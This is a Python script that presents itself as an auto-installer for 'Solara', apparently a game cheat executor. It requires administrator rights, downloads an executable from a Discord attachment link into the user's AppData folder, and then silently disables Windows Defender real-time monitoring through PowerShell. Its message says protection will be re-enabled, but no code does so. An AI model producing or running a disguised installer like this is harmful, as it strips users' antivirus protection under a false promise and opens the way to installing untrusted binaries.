import subprocess, importlib, sys, os, time
import pythoncom
import pywintypes
import win32api
from win32com.shell import shell

appdata = os.getenv('APPDATA')



# Function to install a package using pip
def install_package(package_name):
    try:
        print(f"Installing {package_name}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
        print(f"Successfully installed {package_name}.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to install {package_name}: {e}")

# Function to ensure the package is installed and can be imported
def ensure_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        install_package(package_name)
        try:
            importlib.import_module(package_name)
            print(f"{package_name} is successfully installed and imported.")
        except ImportError:
            print(f"Failed to import {package_name} after installation.")

# List of packages to ensure are installed
required_packages = ["colorama", "requests"]

import requests
from colorama import Fore

def Install(url):
    # Get the APPDATA environment variable
    appdata = os.getenv('APPDATA')

    # Create a directory path for "Solara"
    solara_dir = os.path.join(appdata, "Solara")

    # Check if the directory already exists, if not, create it
    if not os.path.exists(solara_dir):
        os.mkdir(solara_dir)
        print(f"Directory {solara_dir} created.")
    else:
        print(f"Directory {solara_dir} already exists.")

    # Define the full file path where the downloaded content will be saved
    file_path = os.path.join(solara_dir, "Solara.exe")

    # Download the file
    response = requests.get(url)

    # Check if the request was successful
    if response.status_code == 200:
        # Write the content to a file inside the Solara directory
        with open(file_path, 'wb') as file:
            file.write(response.content)
            print(f"File downloaded successfully to {file_path}")
            print("Disabling Windows Security (And re-enabling it)")
            command = 'Set-MpPreference -DisableRealtimeMonitoring $true'

            full_command = f'powershell -Command "{command}" >nul 2>&1'
            os.system(full_command)
    else:
        print(f"Failed to download the file. Status code: {response.status_code}")

# Ensure all packages are installed
for package in required_packages:
    ensure_package(package)

print(f"{Fore.GREEN}Hello, welcome to the Solara auto-installer.")
print(f"Let's start.{Fore.RESET}")

import importlib
import subprocess
import sys


text = r'''
  _  _____                 _           _ 
 (_)/ ____|               | |         | |
  _| (___  _   _ _ __ ___ | |__   ___ | |
 | |\___ \| | | | '_  _ \| '_ \ / _   | |
 | |____) | |_| | | | | | | |_) | (_) | |
 |_|_____/ \__, |_| |_| |_|_.__/ \___/|_|
            __/ |                        
           |___/                         
'''

if shell.IsUserAnAdmin():
    pass
else:
    print(f"{Fore.RED}NUH UH, YOU HAVE TO RUN THIS WITH ADMIN... QUITTING IN 5 SECONDS.{Fore.RESET}")
    time.sleep(5)
    exit(1)

Install("https://cdn.discordapp.com/attachments/1283899703318282314/1283899929428885514/BootstrapperV1.19.exe?ex=66ea9b3c&is=66e949bc&hm=182dc709834c15a514aab98e812c6c3ca9d2954c12e8e7c53cbc71d3591f4918&")



print(text)

